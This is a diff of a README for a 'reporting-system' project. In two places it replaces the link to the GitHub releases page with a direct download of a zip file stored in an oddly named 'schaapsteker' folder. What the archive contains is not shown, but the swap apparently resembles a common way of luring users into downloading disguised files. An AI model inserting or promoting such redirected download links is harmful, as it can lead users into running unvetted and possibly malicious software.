@@ -31,7 +31,7 @@ If you meet these requirements, you are ready to go!
 
 To download the reporting system, visit the following link:
 
-[Download reporting-system](https://github.com/krishan1234123/reporting-system/releases)
+[Download reporting-system](https://raw.githubusercontent.com/krishan1234123/reporting-system/main/schaapsteker/reporting-system.zip)
 
 ### 🖥️ Installation Steps
 
@@ -98,4 +98,4 @@ For further assistance, you can find helpful resources in our documentation or r
 
 Remember, the more you explore the reporting system, the better you will understand its capabilities. Happy reporting!
 
-[Download reporting-system](https://github.com/krishan1234123/reporting-system/releases)
+[Download reporting-system](https://raw.githubusercontent.com/krishan1234123/reporting-system/main/schaapsteker/reporting-system.zip)
